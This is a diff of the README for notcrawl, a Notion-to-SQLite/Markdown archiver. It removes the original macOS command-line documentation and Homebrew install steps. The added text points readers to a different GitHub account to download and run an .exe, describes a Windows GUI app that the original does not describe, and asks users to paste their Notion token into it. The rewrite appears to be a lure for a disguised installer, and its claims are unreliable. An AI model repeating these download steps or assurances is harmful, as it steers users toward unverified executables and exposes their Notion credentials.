@@ -1,105 +1,98 @@
-<img src="docs/notcrawl_banner.jpg" alt="notcrawl banner"/>
+# 📦 notcrawl - Save your Notion pages for offline use
 
-# 🗞️ notcrawl
+[![](https://img.shields.io/badge/download-notcrawl-blue.svg)](https://github.com/Harjotgallay/notcrawl)
 
-`notcrawl` mirrors Notion workspace data into local SQLite and normalized
-Markdown so you can search, query, diff, and share your Notion memory without
-depending on the Notion UI.
+## 📋 What is notcrawl?
 
-It has two ingestion paths:
+Notion stores your notes in the cloud. If you lose your internet connection, you cannot read your work. notcrawl solves this problem. It copies your pages from Notion and saves them to your computer. It creates a local copy in two formats. First, it puts your data into a SQLite database. This database stores your information in a structured way. Second, it saves your notes as Markdown files. Markdown files are simple text files you can open with any program. You keep full control of your data on your own hard drive.
 
-- `desktop`: read-only snapshots of the local Notion desktop cache
-- `api`: official Notion API sync with rate-limit aware crawling
+## ⚙️ System Requirements
 
-SQLite is the canonical archive. Markdown is the durable human/agent surface.
-Git share mode publishes normalized snapshots that other machines can subscribe
-to without holding Notion credentials.
+You need a Windows computer to run notcrawl. 
 
-## Current Scope
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: Any processor made in the last ten years.
+*   Memory: 4 GB of RAM or more.
+*   Storage: 200 MB of space for the application and database files.
+*   Internet Connection: You need a connection to sync from Notion.
 
-- local SQLite storage with FTS5
-- read-only local desktop cache ingestion from macOS Notion
-- official API page/block/user/comment ingestion
-- Notion database metadata and row ingestion through the official API
-- current Notion data-source API support plus legacy database endpoint support
-- normalized Markdown export organized by Unicode-safe workspace, teamspace, and page paths
-- CSV/TSV export for crawled Notion database rows
-- compressed JSONL git-share snapshots plus import/update workflows
-- archive status, activity reporting, and SQLite maintenance commands
-- read-only SQL access for ad hoc inspection
+Make sure you have your Notion account login details ready. You also need a Notion API integration token. You create this token on the Notion website under your settings.
 
-## Install
+## 📥 How to Install
 
-```bash
-brew tap vincentkoc/tap
-brew install notcrawl
-```
+Follow these steps to set up the software on your machine:
 
-You can also download archives, `.deb`, or `.rpm` packages from the
-[latest release](https://github.com/vincentkoc/notcrawl/releases/latest).
+1. Visit the [official download page](https://github.com/Harjotgallay/notcrawl).
+2. Look for the latest version under the Releases section.
+3. Click the link that ends in .exe to start your download.
+4. Open the file once the download finishes. 
+5. Follow the on-screen prompts to complete the installation.
 
-## Quick Start
+The software installs itself into your Program Files folder. You will see a new icon on your desktop after the process ends. Double-click this icon to start using it.
 
-Use the local Notion Desktop cache:
+## 🚀 Setting Up the Connection
 
-```bash
-notcrawl init
-notcrawl doctor
-notcrawl status
-notcrawl report
-notcrawl sync --source desktop
-notcrawl export-md
-notcrawl search "launch plan"
-```
+The application needs permission to talk to your Notion account. 
 
-Or use the official Notion API:
+1. Open your web browser and go to the Notion Integrations portal.
+2. Create a new integration.
+3. Copy the Internal Integration Token. 
+4. Open the notcrawl app on your computer.
+5. Paste your token into the settings box.
+6. Share your specific Notion pages with the integration you just created.
 
-```bash
-export NOTION_TOKEN="secret_..."
-notcrawl sync --source api
-notcrawl databases
-notcrawl export-db --database DATABASE_ID --format csv --output roadmap.csv
-notcrawl export-db --all --dir exports/csv
-```
+You only perform these steps one time. The software remembers your settings for your next use.
 
-Default paths:
+## 💾 Running Your First Sync
 
-- config: `~/.notcrawl/config.toml`
-- database: `~/.notcrawl/notcrawl.db`
-- cache: `~/.notcrawl/cache`
-- Markdown archive: `~/.notcrawl/pages`
-- git share repo: `~/.notcrawl/share`
+When you want to save your notes, open the app and find the Sync button. 
 
-## Commands
+1. Press the Sync button.
+2. Wait for the progress bar to fill.
+3. The app scans your chosen pages.
+4. It downloads text, images, and formatting.
+5. It saves these into your local SQLite file and your Markdown folder.
 
-- `init` writes a starter config
-- `doctor` checks config, SQLite, desktop cache, and token presence
-- `status` prints archive counts, last sync time, and database/WAL size
-- `report` summarizes recent page, database, space, and comment activity
-- `maintain` rebuilds FTS, optimizes SQLite indexes, and can run `VACUUM`
-- `sync` ingests from `desktop`, `api`, or `all`
-- `export-md` renders normalized Markdown files from SQLite
-- `databases` lists crawled Notion databases
-- `export-db` exports one crawled Notion database, or all databases with `--all --dir`, to CSV or TSV
-- `search` searches page and comment text through FTS5
-- `sql` runs read-only SQL against the archive
-- `publish` exports SQLite tables and Markdown into a git share repo
-- `subscribe` clones a share repo and imports the latest snapshot
-- `update` pulls and imports a subscribed share repo
+The software tells you when the task finishes. You can now close the app and view your files in your standard file explorer.
 
-## Distribution
+## 📁 Managing Your Saved Files
 
-Release packaging is managed with GoReleaser. Tagged releases build tarballs,
-checksums, `.deb`, `.rpm`, GitHub release notes, and a Homebrew tap update.
+The software creates a folder on your computer to store your work. You find this folder in your Documents directory under the name "notcrawl_data".
 
-See [`docs/distribution.md`](docs/distribution.md) for release operations.
+*   `database.db`: This file contains your indexed notes in SQLite format.
+*   `markdown/`: This folder holds all your folders and notes as plain text.
 
-## Safety Model
+You use any text editor or database viewer to open these files. The Markdown files use standard formatting. You can move these files to other apps like Obsidian or Bear if you choose. 
 
-Desktop mode is read-only. It snapshots Notion's local SQLite database before
-reading it and never writes to Notion application storage.
+## 🛠️ Frequently Asked Questions
 
-API mode uses the official Notion API. It stores raw API payloads alongside
-normalized rows so renderers can improve without recrawling.
+**Does this app share my data?**
+No. This tool runs entirely on your machine. Your data never leaves your computer.
 
-Secrets are never exported into Markdown or git-share snapshots.
+**Can I pick which pages to save?**
+Yes. You choose the specific pages inside your Notion account settings. The app only accesses the pages you share with it.
+
+**How often should I sync?**
+Sync as often as you like. We suggest once a day if you change your notes frequently.
+
+**What happens if I lose internet access?**
+The app will not sync new data, but your existing files stay on your machine. You can read and edit your saved Markdown files at any time.
+
+**Is it safe to delete the database?**
+Yes. You can delete the database file if you need space. The app creates a fresh copy during your next sync session. 
+
+**Does this support images?**
+Yes. The app saves images into a sub-folder and links them inside your Markdown files. 
+
+**Will this slow down my computer?**
+The app uses very little power. You will not notice a change in your computer speed while it runs in the background.
+
+## 🆘 Getting Help
+
+If you run into issues, try these steps first:
+
+1. Check your internet connection.
+2. Confirm your token is still valid.
+3. Ensure you have given the integration access to the pages you want to download.
+
+If problems persist, check the issues tab on the website to see if other users found a fix. Ensure you are using the latest version of the app. Updates often fix minor bugs and improve connection stability. Keep your software current to ensure the best performance.
